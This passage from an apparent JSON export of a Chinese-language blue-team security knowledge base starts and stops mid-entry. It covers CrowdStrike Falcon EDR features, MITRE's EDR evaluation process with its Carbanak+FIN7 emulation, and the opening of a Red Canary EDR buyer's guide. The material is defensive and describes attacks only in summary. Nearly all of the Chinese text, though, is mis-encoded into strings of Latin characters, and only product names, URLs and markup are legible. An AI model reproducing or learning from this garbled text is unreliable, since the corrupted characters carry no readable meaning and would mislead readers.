ï¼Œæä¾›æœ‰å…³æ”»å‡»è€…çš„è¯¦ç»†ä¿¡æ¯ä»¥åŠæœ‰å…³æ”»å‡»çš„ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚\r\n  - **3. ä¸»åŠ¨é˜²å¾¡ï¼Œæ‰˜ç®¡å¼å¨èƒç‹©çŒ**\r\n    - ä½œä¸º Falcon å¹³å°çš„ä¸€éƒ¨åˆ†ï¼ŒFalcon OverWatchâ„¢ æ‰˜ç®¡å¨èƒè¿½è¸ªæœåŠ¡å¢åŠ äº†ä¸€ä¸ªé¢å¤–çš„ä¿æŠ¤èƒ½åŠ›ï¼Œå®‰å…¨ä¸“å®¶ä¼šå¸®åŠ©å®¢æˆ·é‡‡å–è¡ŒåŠ¨ï¼Œä»¥ç¡®ä¿ä¸ä¼šé—æ¼å¨èƒï¼Œå¹¶æœ€ç»ˆé˜²æ­¢å‘ç”Ÿå¤§è§„æ¨¡æ³„éœ²ã€‚\r\n  - **4. æä¾›å®æ—¶/å†å²çš„å¯è§æ€§**\r\n    - Falcon Insightå°±åƒç»ˆç«¯ä¸Šçš„ DVRï¼Œè®°å½•ç›¸å…³æ´»åŠ¨ä»¥æ•æ‰å°è¯•ç»•è¿‡æ£€æµ‹çš„å®‰å…¨äº‹ä»¶ï¼›Falcon agentè·Ÿè¸ªäº†æ•°ç™¾ä¸ªä¸åŒçš„å®‰å…¨ç›¸å…³äº‹ä»¶ï¼Œä¾‹å¦‚è¿›ç¨‹åˆ›å»ºã€é©±åŠ¨ç¨‹åºåŠ è½½ã€æ³¨å†Œè¡¨ä¿®æ”¹ã€ç£ç›˜è®¿é—®ã€å†…å­˜è®¿é—®æˆ–ç½‘ç»œè¿æ¥ç­‰ï¼Œå®¢æˆ·å¯ä»¥ä»å®‰å…¨è§’åº¦å…¨é¢äº†è§£å…¶ç»ˆç«¯ä¸Šå‘ç”Ÿçš„ä¸€åˆ‡ã€‚\r\n    - è¿™ä¸ºå®‰å…¨å›¢é˜Ÿæä¾›äº†ä»–ä»¬éœ€è¦çš„æœ‰ç”¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š\r\n      - å†…å¤–ä¸å¤–éƒ¨çš„ç½‘ç»œè¿æ¥\r\n      - ç›´æ¥/è¿œç¨‹ç™»å½•çš„æ‰€æœ‰ç”¨æˆ·å¸æˆ·\r\n      - ASP å¯†é’¥çš„å˜æ›´ã€å¯æ‰§è¡Œæ–‡ä»¶å’Œç®¡ç†å·¥å…·çš„ä½¿ç”¨\r\n      - è¿›ç¨‹æ‰§è¡Œ\r\n      - è¯¦ç»†çš„è¿›ç¨‹çº§åˆ«çš„ç½‘ç»œæ´»åŠ¨ï¼ŒåŒ…æ‹¬ DNS è¯·æ±‚ã€è¿æ¥å’Œå¼€æ”¾ç«¯å£\r\n      - å­˜æ¡£æ–‡ä»¶åˆ›å»ºï¼ŒåŒ…æ‹¬ RAR å’Œ ZIPS\r\n      - USBç­‰å¤–éƒ¨å­˜å‚¨ä»‹è´¨\r\n  - **5. åŠ é€Ÿè°ƒæŸ¥**\r\n    - èƒ½å¤ŸåŠ å¿«è°ƒæŸ¥å’Œæœ€ç»ˆä¿®å¤çš„é€Ÿåº¦ï¼Œå› ä¸ºä»ç»ˆç«¯æ”¶é›†çš„ä¿¡æ¯é€šè¿‡Falcon å¹³å°å­˜å‚¨åœ¨ CrowdStrike äº‘ä¸­ï¼Œä½¿ç”¨äº†ä¸€ä¸ªå›¾å½¢æ•°æ®åº“æ¥è·Ÿè¸ªæ¯ä¸ªç»ˆç«¯äº‹ä»¶ä¹‹é—´çš„æ‰€æœ‰å…³ç³»å’Œè”ç³»ï¼Œè¯¥æ•°æ®åº“å¯ä»¥å¿«é€Ÿã€å¤§è§„æ¨¡åœ°æä¾›å†å²å’Œå®æ—¶æ•°æ®çš„è¯¦ç»†ä¿¡æ¯å’Œä¸Šä¸‹æ–‡ï¼Œè¿™ä½¿å®‰å…¨å›¢é˜Ÿèƒ½å¤Ÿæœ‰æ•ˆåœ°è·Ÿè¸ªå³ä½¿æ˜¯æœ€å¤æ‚çš„æ”»å‡»ï¼Œå¹¶åŠæ—¶å‘ç°äº‹ä»¶ï¼Œå¹¶å¯¹å®ƒä»¬è¿›è¡Œåˆ†ç±»ã€éªŒè¯å’Œç¡®å®šä¼˜å…ˆçº§ï¼Œä»è€Œæ›´å¿«ã€æ›´ç²¾ç¡®åœ°è¿›è¡Œè¡¥æ•‘ã€‚\r\n  - **6. å®ç°å¿«é€Ÿçš„ä¿®å¤**\r\n    - Falcon Insight å¯ä»¥éš”ç¦»ç»ˆç«¯ï¼Œå®ƒå…è®¸ç»„ç»‡é€šè¿‡å°†å¯èƒ½å—åˆ°å¨èƒçš„ä¸»æœºä¸æ‰€æœ‰ç½‘ç»œæ´»åŠ¨éš”ç¦»å¼€æ¥é‡‡å–è¿…é€Ÿå’Œå³æ—¶çš„è¡ŒåŠ¨ã€‚å½“ç»ˆç«¯å—è¢«éš”ç¦»ï¼Œå®ƒä»ç„¶å¯ä»¥ä» CrowdStrike äº‘å‘é€å’Œæ¥æ”¶ä¿¡æ¯ï¼Œä½†å³ä½¿ä¸äº‘çš„è¿æ¥è¢«åˆ‡æ–­ï¼Œå®ƒä»å°†ä¿æŒè¢«éš”ç¦»ï¼Œå¹¶åœ¨é‡æ–°å¯åŠ¨æœŸé—´ä¿æŒè¿™ç§éš”ç¦»çŠ¶æ€ã€‚\r\n    - **åœ¨åº”å¯¹æ–°å‡ºç°çš„å¨èƒæ—¶ï¼Œæ—¶é—´è‡³å…³é‡è¦ï¼Œå“åº”è€…éœ€è¦å®æ—¶ã€æ·±å…¥çš„å¯è§æ€§ï¼Œä»¥ä¾¿ä»–ä»¬èƒ½å¤Ÿå¿«é€Ÿæœæ–­åœ°è¿›è¡Œè¡¥æ•‘ã€‚**\r\n    - **ä¿¡æ¯æ”¶é›†å™¨**å…è®¸å®‰å…¨å›¢é˜Ÿé€šè¿‡æ‰§è¡Œä»¥ä¸‹ä»»åŠ¡ï¼Œä»¥äº†è§£å¨èƒçš„é£é™©å’ŒèŒƒå›´ï¼š\r\n      - æµè§ˆæ–‡ä»¶ç³»ç»Ÿå¹¶æå–æ–‡ä»¶\r\n      - åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹\r\n      - æå– Windows äº‹ä»¶æ—¥å¿—\r\n      - æŸ¥è¯¢ Windows æ³¨å†Œè¡¨\r\n      - åˆ—å‡ºå½“å‰çš„ç½‘ç»œè¿æ¥å’Œé…ç½®\r\n      - æå–è¿›ç¨‹å†…å­˜\r\n      - è®¡ç®—æ–‡ä»¶å“ˆå¸Œ\r\n      - æ”¶é›†ç¯å¢ƒå˜é‡\r\n      - ä½¿ç”¨ PowerShell æˆ–å…¶ä»–å·¥å…·æ”¶é›†å…¶ä»–æ‰€éœ€ä¿¡æ¯\r\n    - **è¡¥æ•‘æªæ–½**ä½¿å›¢é˜Ÿèƒ½å¤Ÿè¿…é€Ÿè€Œæœæ–­åœ°é‡‡å–è¡ŒåŠ¨æ¥éåˆ¶æˆ–è¡¥æ•‘å¨èƒï¼ŒåŒ…æ‹¬ï¼š\r\n      - åˆ é™¤æ–‡ä»¶\r\n      - ç»“æŸä¸€ä¸ªè¿›ç¨‹\r\n      - åˆ é™¤æˆ–ä¿®æ”¹ Windows æ³¨å†Œè¡¨é¡¹æˆ–å€¼\r\n      - ä¸Šä¼ æ–‡ä»¶\r\n      - è¿è¡Œè„šæœ¬æˆ–å¯æ‰§è¡Œæ–‡ä»¶\r\n      - åŠ å¯†æ–‡ä»¶\r\n      - é‡å¯/å…³æœº\r\n- å€ŸåŠ© CrowdStrike çš„äº‘åŸç”Ÿæ¶æ„ã€è½»é‡çº§agentå’Œç»Ÿä¸€æ§åˆ¶å°ï¼Œå®æ—¶å“åº”åŠŸèƒ½å¯ä»¥äº¤ä»˜åˆ°ä¸–ç•Œä¸Šä»»ä½•åœ°æ–¹çš„ä»»ä½•ç³»ç»Ÿï¼Œè€Œå¯¹æˆæœ¬æˆ–æ€§èƒ½çš„å½±å“å‡ ä¹ä¸ºé›¶ã€‚\r\n\r\n# 3. å‚è€ƒèµ„æ–™\r\n- [https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/](https://www.crowdstrike.com/cybersecurity-101/indicators-of-compromise/ioa-vs-ioc/)\r\n- [https://www.crowdstrike.com/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/](https://www.crowdstrike.com/cybersecurity-101/endpoint-security/endpoint-detection-and-response-edr/)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/ç»ˆç«¯åŸºç¡€è®¾æ–½/EDRèƒ½åŠ›è¯„ä¼°/MITRE EDRæŠ€æœ¯èƒ½åŠ›è¯„ä¼°/","title":"MITRE EDRæŠ€æœ¯èƒ½åŠ›è¯„ä¼°"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: MITRE EDRæŠ€æœ¯èƒ½åŠ›è¯„ä¼°\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- ç»ˆç«¯åŸºç¡€è®¾æ–½\r\n- EDRèƒ½åŠ›è¯„ä¼°\r\n- èƒ½åŠ›è¯„ä¼°\r\n- MITRE\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\nMITREæ¯å¹´ä¼šä¸¾åŠä¸€æ¬¡å®‰å…¨äº§å“èƒ½åŠ›è¯„ä¼°ï¼Œé€šè¿‡ATT&CKå’ŒçœŸå®çš„APTæ¡ˆä¾‹è¿›è¡Œæ”»å‡»æ¨¡æ‹Ÿï¼Œæœ€å¤§ç¨‹åº¦ç¯å¢ƒçœŸå®çš„æ”»å‡»åœºæ™¯ï¼Œæ•´ä½“è¿‡ç¨‹åˆ†ä¸ºä»¥ä¸‹ä¸‰æ­¥ï¼š\r\n- **1. è®¾è®¡é˜¶æ®µ**\r\n  - é€‰æ‹©å¨èƒï¼ˆAPTäº‹ä»¶ã€æ¶æ„è½¯ä»¶ç­‰ï¼‰\r\n    - æ„å›¾ï¼š è€ƒè™‘å®‰å…¨ç¤¾åŒºæœ€å…³æ³¨çš„é—®é¢˜ï¼ˆä¾‹å¦‚ï¼Œå‹’ç´¢è½¯ä»¶ä¸æ•°æ®çªƒå–ï¼‰\r\n    - å·®å¼‚åŒ–ï¼š å¹³è¡¡ä½¿ç”¨æ–°çš„å’Œä»¥å‰æµ‹è¯•è¿‡çš„æŠ€æœ¯\r\n    - å¤æ‚æ€§ï¼š è€ƒè™‘å¼€å‘èµ„æºä»¥åŠæˆ‘ä»¬æ˜¯åœ¨åŸºçº¿è¿˜æ˜¯æ¨åŠ¨é˜²å¾¡\r\n    - æƒ…æŠ¥ï¼š æˆ‘ä»¬è¯„ä¼°æƒ…æŠ¥çš„æ•°é‡å’Œè´¨é‡ä»¥å½»åº•äº†è§£å¯¹æ‰‹\r\n  - åˆ›å»ºä»¿çœŸè®¡åˆ’\r\n    - åˆ†è§£ï¼š å°†ç½‘ç»œå¨èƒæƒ…æŠ¥ (CTI) æå–åˆ°å•ç‹¬çš„ç¨‹åºä¸­\r\n    - é“¾æ¥ï¼š å°†ç¨‹åºé‡æ–°ç¼–è¯‘å¹¶ç»„ç»‡æˆä¸€ä¸ªæ›´å¤§çš„ä»¿çœŸåœºæ™¯\r\n    - ç»†åŒ–ï¼š æˆ‘ä»¬é€šè¿‡åˆä½œå’Œæœ‰é’ˆå¯¹æ€§çš„ç ”ç©¶å¡«è¡¥ç©ºç™½\r\n  - å¼€å‘ä»¿çœŸ\r\n    - å·¥å…·ï¼š é€‰æ‹©/æ„å»ºå¯ä»¥çœŸå®è¿˜åŸè¡Œä¸ºçš„æ”»å‡»æ€§å·¥å…·\r\n    - å®šåˆ¶ï¼š æ•æ‰é‡è¦çš„ç»†èŠ‚ï¼ˆä¾‹å¦‚ï¼ŒæŠ•é€’æœºåˆ¶ã€C2ç­‰ï¼‰\r\n    - å›é¡¾ï¼š ä¸ CTI è¿›è¡Œæ¯”è¾ƒå¹¶æ³¨æ„åå·®\r\n    - åˆ›å»ºï¼š å°†æ‰€æœ‰ä¿¡æ¯ç¼–è¯‘æˆä¸€ä¸ªç»“æ„åŒ–çš„ä»¿çœŸè®¡åˆ’\r\n- **2. æ‰§è¡Œé˜¶æ®µ**\r\n  - è®¿é—®ç¯å¢ƒ\r\n    - ç¯å¢ƒï¼š ä¸ºæ‰€æœ‰å‚å•†ä¾›æä¾›ç›¸åŒçš„æ‰§è¡Œç¯å¢ƒ\r\n    - å™ªéŸ³(ä»¿çœŸ)ï¼š é™¤äº†æ¨¡æ‹ŸæŠ€æœ¯ï¼ˆä¾‹å¦‚é”®ç›˜è®°å½•ï¼‰æ‰€éœ€çš„æ´»åŠ¨ä¹‹å¤–ï¼Œè¿˜æœ‰ç”¨æˆ·æ´»åŠ¨\r\n  - éƒ¨ç½²è§£å†³æ–¹æ¡ˆ\r\n    - è§£å†³æ–¹æ¡ˆï¼š å‚å•†ä½¿ç”¨å®é™…é…ç½®é…ç½®å…¶è§£å†³æ–¹æ¡ˆ\r\n    - é…ç½®ï¼š å‚å•†ç¡®ä¿é¢„é˜²ã€ä¿æŠ¤å’Œå“åº”ä»…ç”¨äºæ£€æµ‹è¯„ä¼°ï¼Œå¹¶è‡ªåŠ¨ç”¨äºä¿æŠ¤è¯„ä¼°\r\n    - * æ³¨æ„ï¼šæœªç»æ˜ç¡®æ‰¹å‡†ï¼Œç¦æ­¢åœ¨è¯„ä¼°å¼€å§‹åæ›´æ”¹é…ç½®\r\n  - æ‰§è¡Œè¯„ä¼°\r\n    - è¯„ä¼°è€…ï¼šå…¼ä»»æ”»å‡»è€…å’Œç›‘è€ƒè€…ï¼Œå¹¶æä¾›æ£€æµ‹æŒ‡å¯¼ä»¥ååŠ©å‚å•†\r\n    - é˜²å®ˆæ–¹ï¼š å‚å•†æ‹…ä»»ç´«é˜Ÿçš„è§’è‰²\r\n- **3. å‘å¸ƒ**\r\n  - å¤„ç†ç»“æœ\r\n    - ç‹¬ç‰¹æ€§ï¼š ç‹¬ç«‹è€ƒè™‘æ¯ä¸ªå‚å•†\r\n    - ä¸€è‡´æ€§ï¼š æ ¡å‡†æ‰€æœ‰ç»“æœä»¥ç¡®ä¿ä¸€è‡´æ€§\r\n  - æ¥æ”¶åé¦ˆ\r\n    - å®¡æ ¸ï¼š å‚å•†æœ‰ 10 å¤©çš„æ—¶é—´æä¾›åé¦ˆï¼Œå…¶ä¸­å¯ä»¥åŒ…æ‹¬è¦è€ƒè™‘çº³å…¥çš„å…¶ä»–æ•°æ®ï¼Œæˆ–å¯¹åˆæ­¥ç»“æœçš„ä¿®æ”¹\r\n    - åˆ†æï¼š ä¼šè€ƒè™‘æ‰€æœ‰åé¦ˆå¹¶åšå‡ºæœ€ç»ˆå†³å®š\r\n  - å‘å¸ƒç»“æœ\r\n    - è„±æ•ï¼š å‚å•†å¯¹æ•æ„Ÿæ€§é—®é¢˜ï¼ˆä¾‹å¦‚è§„åˆ™é€»è¾‘ï¼‰è¿›è¡Œæœ€ç»ˆå®¡æŸ¥\r\n    - å‘å¸ƒï¼š å…¬å¼€å‘å¸ƒç»“æœå’Œæ–¹æ³•\r\n\r\n# 2. 2021å¹´çš„è¯„ä¼°æ¨¡æ‹ŸCarbanak + FIN7\r\n- ä»‹ç»\r\n  - **Carbanak åœºæ™¯**ï¼š åˆæ³•ç”¨æˆ·æ‰§è¡Œé€šè¿‡é’ˆå¯¹é‡‘èæœºæ„çš„é±¼å‰å¼ç½‘ç»œé’“é±¼æ”»å‡»æä¾›çš„æ¶æ„è½½è·ã€‚åœ¨æ‹¿åˆ°æƒé™ä¹‹åï¼ŒCarbanak é€šè¿‡ç‰¹æƒå‡çº§ã€å‡­è¯è®¿é—®å’Œæ¨ªå‘ç§»åŠ¨æ¥æ‰©å±•å¯¹å…¶ä»–ä¸»æœºçš„è®¿é—®ï¼Œç›®çš„æ˜¯ç ´åè´§å¸å¤„ç†æœåŠ¡ã€è‡ªåŠ¨æŸœå‘˜æœºå’Œé‡‘èè´¦æˆ·ã€‚å½“ Carbanak æŸå®³æ½œåœ¨æœ‰ä»·å€¼çš„ç›®æ ‡æ—¶ï¼Œä»–ä»¬ä¼šå»ºç«‹æŒä¹…æ€§ï¼Œä»¥ä¾¿ä»–ä»¬å¯ä»¥äº†è§£é‡‘èç»„ç»‡çš„å†…éƒ¨ç¨‹åºå’ŒæŠ€æœ¯ã€‚ä½¿ç”¨è¿™äº›ä¿¡æ¯ï¼ŒCarbanak å°†èµ„é‡‘è½¬ç§»åˆ°ä»–ä»¬æ§åˆ¶çš„é“¶è¡Œè´¦æˆ·ï¼Œ\r\n  - **FIN7 åœºæ™¯**ï¼šæ­¤åœºæ™¯æ¨¡æ‹Ÿ FIN7 ä»¥é…’åº—ç»ç†ä¸ºç›®æ ‡ï¼Œä»¥è·å–ä¿¡ç”¨å¡ä¿¡æ¯ã€‚è¯¥åœºæ™¯å¼€å§‹äº FIN7 åœ¨ä¸çŸ¥æƒ…çš„ç”¨æˆ·æ‰§è¡Œæ¶æ„ .LNK æ–‡ä»¶åå®ç°å¯¹ç½‘ç»œçš„åˆå§‹è®¿é—®æƒé™ã€‚FIN7 ç„¶åè½¬å‘ç‰¹æƒ IT ç®¡ç†å‘˜å·¥ä½œç«™ã€‚ä»è¿™ä¸ªç³»ç»Ÿï¼ŒFIN7 é”®ç›˜è®°å½•è®¿é—®ä¼šè®¡å·¥ä½œç«™æ‰€éœ€çš„å‡­æ®ã€‚FIN7 ç„¶åè½¬å‘ä¼šè®¡å·¥ä½œç«™ï¼Œå»ºç«‹æŒä¹…æ€§ï¼Œå¹¶éƒ¨ç½²æ¶æ„è½¯ä»¶ä»è¿›ç¨‹å†…å­˜ä¸­æŠ“å–ä¿¡ç”¨å¡ä¿¡æ¯ã€‚\r\n- æ“ä½œæµç¨‹\r\n  - ![65iZsu](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/65iZsu.jpg)\r\n- æŠ€æœ¯èŒƒå›´\r\n  - å¯¹äº Carbanak å’Œ FIN7 è¯„ä¼°ï¼Œ11 ç§ ATT&CK ç­–ç•¥ä¸­çš„ 65 ç§ ATT&CK æŠ€æœ¯éƒ½åœ¨æ­¤è¯„ä¼°èŒƒå›´å†…ã€‚è¿™åŒ…æ‹¬æ¶µç›– Carbanak è¯„ä¼°çš„ Linux éƒ¨åˆ†çš„ 7 ç§ ATT&CK ç­–ç•¥ä¸­çš„ 12 ç§ ATT&CK æŠ€æœ¯ã€‚\r\n  - æ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹æˆ‘ä»¬åœ¨[æ­¤å¤„](https://mitre-attack.github.io/attack-navigator/v2/enterprise/#layerURL=https://raw.githubusercontent.com/attackevals/website/master/downloadable_JSON/CarbanakFin7_Navigator_layer.json)æä¾›çš„å±‚æ–‡ä»¶ï¼Œåœ¨ ATT&CK å¯¼èˆªå™¨ä¸­æŸ¥çœ‹ Carbanak+FIN7 è¯„ä¼°çš„èŒƒå›´å†…æŠ€æœ¯ã€‚é¢„è§ˆå›¾å¦‚ä¸‹ï¼ä¸“é—¨å½’å› äº Carbanak çš„èŒƒå›´å†…çš„æŠ€æœ¯ä»¥è“è‰²çªå‡ºæ˜¾ç¤ºï¼Œä¸“é—¨å½’å› äº FIN7 çš„æŠ€æœ¯ä»¥çº¢è‰²çªå‡ºæ˜¾ç¤ºï¼Œè€Œ Carbanak å’Œ FIN7 å‡ä»¥é»„è‰²çªå‡ºæ˜¾ç¤ºã€‚\r\n  - ![IxwRMn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/IxwRMn.jpg)\r\n- ç¯å¢ƒ\r\n  - è¯„ä¼°æ˜¯åœ¨ Microsoft Azure ä¸­è¿›è¡Œçš„ã€‚æ¯ä¸ªä¾›åº”å•†éƒ½æä¾›äº†ä¸¤ä¸ªç›¸åŒçš„ç¯å¢ƒï¼Œç”±å…«å°ä¸»æœºç»„æˆï¼Œæ¯å°ä¸»æœºéƒ½å®‰è£…äº†ä»–ä»¬çš„å®¢æˆ·ç«¯è½¯ä»¶ã€‚è¿™ä¸¤ç§ç¯å¢ƒåˆ†åˆ«ç”¨äºä»…æ£€æµ‹å’Œä¿æŠ¤æµ‹è¯•ã€‚\r\n  - ![9CiRAa](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/9CiRAa.jpg)\r\n\r\n# 3. ä¸¾ä¾‹ï¼šCrowdStrikeè¯„ä¼°ç»“æœ\r\n- å‘Šè­¦ç­–ç•¥\r\n  - æ”»å‡»ç›¸å…³çš„æŒ‡æ ‡éƒ½è¢«åˆ†é…äº†ä¸¥é‡ç­‰çº§ï¼ˆä¿¡æ¯ã€ä½ã€ä¸­ã€é«˜ã€ä¸¥é‡ï¼‰ï¼ŒåŒæ—¶è¿˜åŒ…å«äº†ä¸°å¯Œçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå¦‚æ¦‚è¿°ã€å¯¹åº”çš„ATT&CKã€è¿›ç¨‹ã€ç”¨æˆ·ã€ä¸»æœºåŠå¯¹åº”çš„èµ„äº§ä¿¡æ¯ç­‰ã€‚æ­¤å¤–ï¼Œè¿˜ä½¿ç”¨CrowdScoreï¼ˆæ»¡åˆ† 10ï¼Œç»“åˆæ”»å‡»è¡Œä¸ºï¼Œè·¨è¿›ç¨‹ã€è·¨æœºå™¨ï¼‰æ¥è¡¡é‡å½“å‰æ”»å‡»è¡Œä¸ºåœ¨å®¢æˆ·ç¯å¢ƒçš„ä¸¥é‡ç¨‹åº¦ã€‚\r\n- å…¶ä»–ç­–ç•¥\r\n  - ![xoqt1H](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/xoqt1H.jpg)\r\n\r\n# 4. å‚è€ƒèµ„æ–™\r\n- [https://attackevals.mitre-engenuity.org/enterprise/participants/crowdstrike/results?adversary=carbanak_fin7&scenario=1#carbanak_fin7_test_11](https://attackevals.mitre-engenuity.org/enterprise/participants/crowdstrike/results?adversary=carbanak_fin7&scenario=1#carbanak_fin7_test_11)\r\n- [https://attackevals.mitre-engenuity.org/enterprise/carbanak_fin7](https://attackevals.mitre-engenuity.org/enterprise/carbanak_fin7)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/ç»ˆç«¯åŸºç¡€è®¾æ–½/EDRèƒ½åŠ›è¯„ä¼°/Red Canary EDRä¹°å®¶æŒ‡å—/","title":"Red Canary EDRä¹°å®¶æŒ‡å—"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Red Canary EDRä¹°å®¶æŒ‡å—\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- ç»ˆç«¯åŸºç¡€è®¾æ–½\r\n- EDRèƒ½åŠ›è¯„ä¼°\r\n- Red Canary\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\nRed Canary çš„æŠ€æœ¯å›¢é˜Ÿä¸€ç›´åœ¨å…³æ³¨ EDR å¸‚åœºï¼Œè¯„ä¼°æ–°æŠ€æœ¯ï¼Œå¹¶å·²æˆåŠŸæŒ‡å¯¼æ•°ä»¥åƒè®¡çš„ç»„ç»‡è¿›è¡Œ EDR çš„è¯„ä¼°å’Œå®æ–½ï¼Œæœ¬æŒ‡å—æ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è‡ªç„¶è€Œç„¶äº§å‡ºçš„ã€‚åœ¨è´­ä¹°EDRå‰æˆ‘ä»¬éœ€è¦äº†è§£ï¼š\r\n\r\n- å…¬å¸çš„ä¸šåŠ¡éœ€æ±‚ã€æŠ€æœ¯è¦æ±‚å’Œå†…éƒ¨èƒ½åŠ›\r\n- EDRäº§å“å¯¹å…¬å¸å®‰å…¨è¿è¥å¸¦æ¥çš„æ½œåœ¨å½±å“\r\n- ç”¨æ¥åŒºåˆ†EDRäº§å“çš„å…³é”®å› ç´ æ˜¯ä»€ä¹ˆ\r\n\r\næœ¬æŒ‡å—é‡ç‚¹ä»‹ç»äº†æ¯ä¸ªå®‰å…¨å›¢é˜Ÿåœ¨è´­ä¹° EDR äº§å“ä¹‹å‰éœ€è¦å›ç­”çš„ 14 ä¸ªé—®é¢˜ã€‚\r\n\r\n# 2. æœ€é‡è¦çš„é—®é¢˜\r\nä¸ºä»€ä¹ˆè¦è´­ä¹°EDRäº§å“?\r\n- è´­ä¹° EDR äº§å“çš„åŸå› æœ‰å¾ˆå¤šï¼Œäº†è§£æ‚¨çš„ç›®æ ‡æ˜¯å…³é”®ç¬¬ä¸€æ­¥ã€‚\r\n\r\n**ä¸šåŠ¡ä¾§é‡ç‚¹**\r\n- ä½¿ç”¨è¯¥è§£å†³æ–¹æ¡ˆéœ€è¦ä»€ä¹ˆæ°´å¹³çš„ä¸“ä¸šçŸ¥è¯†å’Œæ—¶é—´æŠ•å…¥ï¼Ÿ\r\n  - ![9P2IbH](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/9P2IbH.jpg)\r\n  - å‚å•†æä¾›çš„è§£å†³æ–¹æ¡ˆï¼šMDRå’ŒMSSPã€‚\r\n- éƒ¨ç½²æ—¶å¯¹ä¸šåŠ¡æœ‰ä»€ä¹ˆå½±å“ï¼Ÿ\r\n  - EDR è§£å†³æ–¹æ¡ˆåº”è¯¥å¯ä»¥ä½¿ç”¨ä»»ä½•æœ¬æœºæˆ–ç¬¬ä¸‰æ–¹éƒ¨ç½²å®ç”¨ç¨‹åºè½»æ¾éƒ¨ç½²åˆ°ç»ˆç«¯ã€‚ éœ€è¦é‡å¯çš„è§£å†³æ–¹æ¡ˆå¯èƒ½ä¼šäº§ç”Ÿé‡å¤§çš„ä¸šåŠ¡å½±å“ï¼Œå¹¶éœ€è¦æ›´å¤šçš„ç»„ç»‡åè°ƒã€‚\r\n- èƒ½å¦å–ä»£ç°æœ‰çš„ç»ˆç«¯å®‰å…¨æ–¹æ¡ˆï¼Ÿ\r\n  - ä»Šå¤©çš„è®¸å¤š EDR è§£å†³æ–¹æ¡ˆå¹¶ä¸ç›´æ¥å–ä»£å¸¸è§çš„å®‰å…¨æ–¹æ¡ˆï¼Œè€Œæ˜¯ä¸“æ³¨äºåŠ å¼ºå®‰å…¨æ€åŠ¿çš„ç‰¹å®šéƒ¨åˆ†ï¼›å¸¸è§çš„ç°æœ‰ç»ˆç«¯å®‰å…¨æ–¹æ¡ˆæœ‰ï¼š\r\n    - æ€æ¯’è½¯ä»¶ã€DLPã€FIMã€HIDSã€UBAç­‰ã€‚\r\n\r\n**æŠ€æœ¯èƒ½åŠ›**\r\n- æ”¯æŒå“ªäº›å¹³å°å’Œæ“ä½œç³»ç»Ÿï¼Ÿ\r\n  - ç†æƒ³æƒ…å†µä¸‹ï¼Œå•ä¸€è§£å†³æ–¹æ¡ˆå°†é€‚ç”¨äºæœåŠ¡å™¨ã€PCã€ç¬”è®°æœ¬ç”µè„‘å’Œå…¶ä»–ç»ˆç«¯ã€‚\r\n- æä¾›ä»€ä¹ˆçº§åˆ«çš„å¯è§æ€§ï¼Ÿ\r\n  - å¦‚æœ EDR ç¼ºä¹å¯¹æ•°æ®çš„æ”¶é›†ï¼Œåˆ™å®ƒçš„ä»·å€¼æœ‰é™ï¼› æŠŠå®ƒæƒ³è±¡æˆä¸€ä¸ªç‰©ç†å®‰å…¨ç³»ç»Ÿï¼šå…‰å­¦å®‰å…¨æ‘„åƒå¤´è¿œä¸å¦‚èƒ½åŒæ—¶æ”¶é›† X å°„çº¿ã€çº¢å¤–çº¿å’ŒæŒ¯åŠ¨æ•°æ®çš„æ‘„åƒå¤´ã€‚\r\n  - å¸¸è§çš„æ•°æ®åŒ…å«ï¼šè¿›ç¨‹ä¿¡æ¯ã€ç½‘ç»œè¿æ¥ã€æ–‡ä»¶ä¿®æ”¹è®°å½•ã€æ³¨å†Œè¡¨è®°å½•ã€äºŒè¿›åˆ¶æ–‡ä»¶ã€å†…å®¹ã€ç”¨æˆ·ä¿¡æ¯ç­‰ã€‚\r\n- å¦‚ä½•ä¸é¢„é˜²æªæ–½ç›¸ç»“åˆï¼Ÿ\r\n  - EDR è§£å†³æ–¹æ¡ˆè¶Šæ¥è¶Šå¤šåœ°æˆä¸ºç»ˆç«¯ä¿æŠ¤å¹³å°çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯ç‹¬ç«‹çš„å·¥å…·ã€‚ é€‰æ‹©å…·æœ‰â€œå¤šåˆä¸€â€çš„è§£å†³æ–¹æ¡ˆéå¸¸é‡è¦ã€‚\r\n- å¦‚ä½•æ£€æµ‹é¢ä¸´çš„å¨èƒï¼Ÿ\r\n  - äº†è§£ EDR è§£å†³æ–¹æ¡ˆæ£€æµ‹åˆ°çš„å¨èƒç±»å‹ä»¥åŠä½¿ç”¨çš„æŠ€æœ¯å’ŒæŠ€å·§åº”è¯¥æ˜¯è¯„ä¼°çš„æ ¸å¿ƒã€‚ è®¸å¤šè§£å†³æ–¹æ¡ˆé‡‡ç”¨éå¸¸æœ‰é™çš„æ£€æµ‹æ–¹æ³•ï¼Œå¹¶ä¸”æ— æ³•æä¾›æ›´å¹¿æ³›çš„å¨èƒè¦†ç›–èŒƒå›´ã€‚\r\n  - 